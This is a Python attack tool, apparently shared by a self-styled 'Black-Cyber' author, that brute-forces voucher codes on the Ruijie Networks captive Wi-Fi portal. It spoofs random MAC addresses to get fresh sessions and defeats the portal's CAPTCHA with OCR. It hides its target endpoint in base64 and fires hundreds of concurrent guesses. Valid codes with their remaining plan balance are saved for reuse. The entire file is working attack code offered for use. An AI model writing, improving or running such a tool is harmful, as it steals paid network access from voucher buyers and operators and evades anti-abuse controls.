#!/usr/bin/env python3
# KHEANG - Ruijie Voucher Scanner v2.0
# HeaNg[Black-Cyber] - Speed Mode Active

import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta
import os
import sys
import gc
import hashlib
import threading
import socket
import platform
import struct

# ── COLORS ──────────────────────────────────────────────────────────────
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
END = '\033[0m'

def cprint(text, color="white", bold=False):
    colors = {"red": RED, "green": GREEN, "yellow": YELLOW, "blue": BLUE, "cyan": CYAN, "magenta": MAGENTA}
    prefix = colors.get(color, "")
    if bold:
        prefix += BOLD
    print(f"{prefix}{text}{END}")

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    print(f"""
{CYAN}╔══════════════════════════════════════════════════════════════════╗
    {RED}██╗  ██╗███████╗ █████╗ ███╗   ██╗ ██████╗ 
    {YELLOW}██║  ██║██╔════╝██╔══██╗████╗  ██║██╔════╝
    {GREEN}███████║█████╗  ███████║██╔██╗ ██║██║  ███╗
    {BLUE}██╔══██║██╔══╝  ██╔══██║██║╚██╗██║██║   ██║
    {MAGENTA}██║  ██║███████╗██║  ██║██║ ╚████║╚██████╔╝
    {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ {END}
{CYAN}╚══════════════════════════════════════════════════════════════════╝
    {GREEN}             🔥 K H E A N G 🔥{END}
    {CYAN}        ⚡ Speed Mode Active ⚡{END}
    """)

# ── CONFIGURATION ──────────────────────────────────────────────────────────
BATCH_SIZE = 2000
MAX_CONCURRENT = 300
CONNECTION_LIMIT = 300
RESULT_FILE = "scan_results.txt"
CONFIG_FILE = "config.json"
MAX_DISPLAY_HITS = 999

# ── GLOBALS ──────────────────────────────────────────────────────────────
session = None
_connector = None
SUCCESS_CODES = []
LIMITED_CODES = []
session_url = None
scan_running = False
scan_stop = False
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)
MIXED_CHARS = list(string.ascii_lowercase + string.digits)
current_code = "000000"
hits = 0
expired = 0
limits = 0
checked_total = 0
scan_start_time = 0
found_list = []
retry_total = 0
checked_codes = set()

def format_time(seconds):
    if seconds == float('inf') or seconds <= 0:
        return "N/A"
    if seconds > 86400:
        return f"⏳ {int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"⏳ {int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"⏳ {int(seconds/60)}m {int(seconds%60)}s"
    return f"⏳ {int(seconds)}s"

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|d|h|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit == 'm':
            total += val
    return total

# ── GENERATORS ──────────────────────────────────────────────────────────
def iter_digit_codes(mode, start_digit=None):
    global current_code
    used = set()
    length = int(mode)
    
    if mode in ["6", "7"]:
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            codes = [str(i).zfill(length) for i in range(start, end)]
            random.shuffle(codes)
            for code in codes:
                if code not in used:
                    used.add(code)
                    current_code = code
                    yield code
            return
        else:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            for code in codes:
                if code not in used:
                    used.add(code)
                    current_code = code
                    yield code
            return
    
    if mode == "8":
        ranges = list(range(0, 100, 10))
        random.shuffle(ranges)
        for start_range in ranges:
            start = start_range * 1000000
            end = (start_range + 10) * 1000000
            chunk_codes = [str(i).zfill(8) for i in range(start, end)]
            random.shuffle(chunk_codes)
            for code in chunk_codes:
                if code not in used:
                    used.add(code)
                    current_code = code
                    yield code
            gc.collect()
    elif mode == "9":
        ranges = list(range(0, 1000, 10))
        random.shuffle(ranges)
        for start_range in ranges:
            start = start_range * 1000000
            end = (start_range + 10) * 1000000
            chunk_codes = [str(i).zfill(9) for i in range(start, end)]
            random.shuffle(chunk_codes)
            for code in chunk_codes:
                if code not in used:
                    used.add(code)
                    current_code = code
                    yield code
            gc.collect()
    else:
        raise ValueError(f"Unsupported digit mode: {mode}")

def iter_mixed(length=6):
    chars = MIXED_CHARS
    used = set()
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code not in used:
            used.add(code)
            yield code

def iter_lowercase(length=6):
    chars = LOWERCASE_CHARS
    used = set()
    common = ['admin', 'guest', 'user', 'pass', 'test', 'login', 'root', 'wifi']
    for word in common:
        if len(word) <= length:
            padded = word.ljust(length, 'a')
            if len(padded) == length and padded not in used:
                used.add(padded)
                yield padded
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code not in used:
            used.add(code)
            yield code

def iter_codes(mode, start_digit=None):
    if mode.startswith("mixed"):
        length = int(mode.replace("mixed", ""))
        return iter_mixed(length)
    elif mode.startswith("lower"):
        length = int(mode.replace("lower", ""))
        return iter_lowercase(length)
    elif mode in ["6", "7", "8", "9"]:
        return iter_digit_codes(mode, start_digit)
    else:
        raise ValueError(f"Unsupported mode: {mode}")

# ── CAPTCHA FUNCTIONS ──────────────────────────────────────────────────────────
def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except:
        return None

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                                   params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
               'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                                   headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

# ── BALANCE CHECKER ──────────────────────────────────────────────────────────────
async def get_balance_info(session_id):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
    }
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {})
                    if not result:
                        result = data.get("data", {})
                    minutes = None
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 
                               'leftMinutes', 'balance', 'remaining', 'total', 'time']:
                        if key in result and result[key] is not None:
                            minutes = result[key]
                            break
                    if minutes is None:
                        continue
                    plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                    mins_float = float(minutes)
                    if mins_float <= 0:
                        display = "💀 Expired"
                        balance_minutes = 0
                    elif mins_float >= 999999:
                        display = "♾️ Unlimited"
                        balance_minutes = float('inf')
                    else:
                        balance_minutes = mins_float
                        total_secs = mins_float * 60
                        if total_secs > 86400:
                            days = int(total_secs / 86400)
                            hours = int((total_secs % 86400) / 3600)
                            mins = int((total_secs % 3600) / 60)
                            display = f"📅 {days}d {hours}h {mins}m"
                        elif total_secs > 3600:
                            hours = int(total_secs / 3600)
                            mins = int((total_secs % 3600) / 60)
                            display = f"⏰ {hours}h {mins}m"
                        elif total_secs > 60:
                            display = f"⏱️ {int(mins_float)}m"
                        else:
                            display = f"⏱️ {int(total_secs)}s"
                    final_display = f"{plan_name} | {display}"
                    return (final_display, balance_minutes, plan_name)
            except:
                continue
    return ("Unknown | N/A", 0, "Unknown")

# ── SAVE FUNCTIONS ──────────────────────────────────────────────────────
def save_result(code, info, kind="HIT"):
    try:
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{kind}] {code}  |  {info}\n")
    except:
        pass

def save_results():
    global SUCCESS_CODES, LIMITED_CODES, checked_total, expired, retry_total, limits
    try:
        with open(RESULT_FILE, 'w', encoding="utf-8") as f:
            f.write("=" * 80 + "\n")
            f.write(f"🔥 SCAN RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"✅ HITS ({len(SUCCESS_CODES)}):\n")
            if SUCCESS_CODES:
                for i, code in enumerate(SUCCESS_CODES, 1):
                    f.write(f"  {i}. {code.get('code', 'N/A')} | {code.get('plan', 'N/A')} | {code.get('balance', 'N/A')}\n")
            else:
                f.write("  (None)\n")
            
            f.write(f"\n⚠️ LIMITS ({len(LIMITED_CODES)}):\n")
            if LIMITED_CODES:
                for i, code in enumerate(LIMITED_CODES, 1):
                    f.write(f"  {i}. {code.get('code', 'N/A')} | {code.get('info', 'N/A')}\n")
            else:
                f.write("  (None)\n")
            
            f.write(f"\n📊 STATISTICS:\n")
            f.write(f"  Total Checked: {checked_total}\n")
            f.write(f"  Total Expired: {expired}\n")
            f.write(f"  Total Retries: {retry_total}\n")
            f.write(f"  Total Limits: {limits}\n")
            f.write("=" * 80 + "\n")
    except Exception as e:
        pass

# ── PERFORM CHECK ──────────────────────────────────────────────────────────
async def perform_check_silent(code, plan_filters=None, session_id_cache=None):
    global retry_total, expired, limits, hits, found_list, SUCCESS_CODES, LIMITED_CODES, current_code
    current_code = code
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    session_id = session_id_cache
    timeout = aiohttp.ClientTimeout(total=8, connect=2)
    
    for attempt in range(2):
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=timeout
            ) as task_session:
                if not session_id:
                    session_id = await get_session_id(task_session, session_url)
                    if not session_id:
                        expired += 1
                        return None
                
                image = await Captcha_Image(task_session, session_id)
                if not image:
                    expired += 1
                    return None
                text = await Captcha_Text(image)
                if not text:
                    expired += 1
                    return None
                if not await Varify_Captcha(task_session, session_id, text):
                    expired += 1
                    return None
                
                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": text,
                }
                headers = {
                    "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
                    "content-type": "application/json",
                    "accept": "*/*",
                }
                try:
                    async with task_session.post(post_url, json=data, headers=headers, timeout=6) as req:
                        response = await req.text()
                        
                        if 'request limited' in response:
                            retry_total += 1
                            await asyncio.sleep(0.3)
                            continue
                        
                        if 'logonUrl' in response:
                            balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
                            if plan_filters:
                                matched = False
                                for filter_plan in plan_filters:
                                    filter_minutes = plan_to_minutes(filter_plan)
                                    if filter_plan.lower() in ('unlimit', 'unlimited'):
                                        if balance_minutes == float('inf'):
                                            matched = True
                                            break
                                    elif balance_minutes >= filter_minutes:
                                        matched = True
                                        break
                                if not matched:
                                    return None
                            
                            info = f"{plan_name} | {balance_display}"
                            found_list.append({
                                "code": code,
                                "plan": plan_name,
                                "balance": balance_display
                            })
                            SUCCESS_CODES.append({
                                "code": code,
                                "plan": plan_name,
                                "balance": balance_display,
                                "minutes": balance_minutes,
                                "session_id": session_id
                            })
                            hits += 1
                            save_result(code, info, "HIT")
                            return True
                        elif 'STA' in response:
                            info = "STA Limited"
                            limits += 1
                            LIMITED_CODES.append({
                                "code": code,
                                "info": info
                            })
                            save_result(code, info, "LIMIT")
                            return True
                        else:
                            expired += 1
                            return None
                except:
                    expired += 1
                    return None
        except:
            expired += 1
            return None
    
    expired += 1
    return None

# ── LIVE DISPLAY ──────────────────────────────────────────────────────────────
scan_speed_history = []

def format_progress_live(checked, speed=0):
    global scan_speed_history, current_code, hits, expired, limits, retry_total, found_list
    
    if len(scan_speed_history) > 5:
        scan_speed_history.pop(0)
    scan_speed_history.append(speed)
    display_speed = int(sum(scan_speed_history) / len(scan_speed_history)) if scan_speed_history else speed
    
    speed_str = f"🚀 {display_speed:,.0f}/min"
    
    elapsed = time.time() - scan_start_time
    time_str = format_time(elapsed)
    
    lines = []
    lines.append("")
    lines.append(f"  {CYAN}╔═══════════════════════════════════════════════════════════════╗{END}")
    lines.append(f"  {CYAN}║{END}  {CYAN}📊 TRIED   : {checked:,}{END}                                      {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {YELLOW}🔑 CURRENT : {current_code}{END}                                      {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {BLUE}⚡ SPEED   : {speed_str}{END}                                    {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {MAGENTA}⏱️ TIME    : {time_str}{END}                                    {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {BOLD}🛑 PRESS CTRL+C TO STOP{END}                             {CYAN}║{END}")
    lines.append(f"  {CYAN}╠═══════════════════════════════════════════════════════════════╣{END}")
    lines.append(f"  {CYAN}║{END}  {GREEN}✅ HITS    : {hits}{END}                                       {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {RED}💀 EXPIRED : {expired}{END}                                       {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {YELLOW}⚠️ LIMITS  : {limits}{END}                                       {CYAN}║{END}")
    lines.append(f"  {CYAN}║{END}  {RED}🔄 RETRIES : {retry_total}{END}                                       {CYAN}║{END}")
    lines.append(f"  {CYAN}╚═══════════════════════════════════════════════════════════════╝{END}")
    
    if found_list:
        lines.append("")
        lines.append(f"  {GREEN}━━━ 🎯 Found Codes ({len(found_list)}) ━━━{END}")
        display_limit = MAX_DISPLAY_HITS
        display_items = found_list[-display_limit:]
        
        for idx, item in enumerate(display_items, 1):
            code = item.get('code', 'N/A')
            plan = item.get('plan', 'N/A')
            balance = item.get('balance', 'N/A')
            lines.append(f"  {GREEN}{idx}.{END} 🔑 {code} | {YELLOW}{plan}{END} | {CYAN}{balance}{END}")
        
        if len(found_list) > display_limit:
            lines.append(f"  {YELLOW}... and {len(found_list) - display_limit} more codes (check scan_results.txt){END}")
    
    return "\n".join(lines)

# ── MAIN SCANNER LOOP ──────────────────────────────────────────────────────────
async def scanner_loop(mode, start_digit=None, plan_filters=None):
    global checked_total, scan_start_time, scan_stop, _connector, found_list
    
    scan_start_time = time.time()
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, ttl_dns_cache=300, force_close=True)
    
    code_gen = iter_codes(mode, start_digit)
    
    print(f"\n{GREEN}🚀 Scan started...{END}")
    
    try:
        while not scan_stop:
            tasks = []
            for _ in range(MAX_CONCURRENT):
                try:
                    code = next(code_gen)
                    tasks.append(perform_check_silent(code, plan_filters))
                    checked_total += 1
                except StopIteration:
                    scan_stop = True
                    break
            
            if not tasks:
                break
                
            await asyncio.gather(*tasks)
            
            elapsed = time.time() - scan_start_time
            speed = (checked_total / elapsed) * 60 if elapsed > 0 else 0
            
            clear_screen()
            print_banner()
            print(format_progress_live(checked_total, speed))
            
            await asyncio.sleep(0.05)
            
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Scan stopped by user.{END}")
    finally:
        await _connector.close()
        save_results()
        print(f"\n{GREEN}✅ Scan finished. Results saved to {RESULT_FILE}{END}")

# ── MAIN MENU ──────────────────────────────────────────────────────────────
async def main():
    global session_url
    clear_screen()
    print_banner()
    
    cprint("📌 Enter Portal URL (with mac=...):", "cyan")
    session_url = input(f"{YELLOW}➜ {END}").strip()
    if not session_url:
        cprint("❌ URL cannot be empty!", "red")
        return

    options = [
        ("1", "🔢 6 Digits"),
        ("2", "🔢 7 Digits"),
        ("3", "🔢 8 Digits"),
        ("4", "🔢 9 Digits"),
        ("5", "🔤 Mixed (6 chars)"),
        ("6", "🔡 Lowercase (6 chars)"),
    ]
    
    while True:
        clear_screen()
        print_banner()
        cprint("📋 Select Scan Mode:", "cyan", bold=True)
        for i, (key, desc) in enumerate(options):
            print(f"  {CYAN}[{key}]{END} {desc}")
        
        choice = input(f"\n{YELLOW}➜ Choose: {END}").strip()
        
        found_option = False
        selected_mode = ""
        
        for key, desc in options:
            if choice == key:
                found_option = True
                selected_mode = key
                break
        
        if found_option:
            clear_screen()
            print_banner()
            cprint("📋 Selected Scan Mode:", "cyan", bold=True)
            for key, desc in options:
                if choice == key:
                    print(f"  {CYAN}[{key}]{END} {desc} {GREEN}✅{END}")
                else:
                    print(f"  {CYAN}[{key}]{END} {desc}")
            
            time.sleep(1)
            
            mode_map = {
                "1": "6",
                "2": "7",
                "3": "8",
                "4": "9",
                "5": "mixed6",
                "6": "lower6"
            }
            
            final_mode = mode_map[selected_mode]
            
            start_digit = None
            if final_mode in ["6", "7"]:
                cprint(f"\n🔢 Enter Start Digit (0-9) or press Enter for random:", "cyan")
                sd = input(f"{YELLOW}➜ {END}").strip()
                if sd.isdigit() and 0 <= int(sd) <= 9:
                    start_digit = sd
            
            cprint(f"\n📋 Enter Plan Filters (e.g. 'unlimit, 30d, 1h') or press Enter for all:", "cyan")
            filters_raw = input(f"{YELLOW}➜ {END}").strip()
            plan_filters = [f.strip() for f in filters_raw.split(",")] if filters_raw else None
            
            await scanner_loop(final_mode, start_digit, plan_filters)
            break
        else:
            cprint("❌ Invalid choice! Please try again.", "red")
            time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass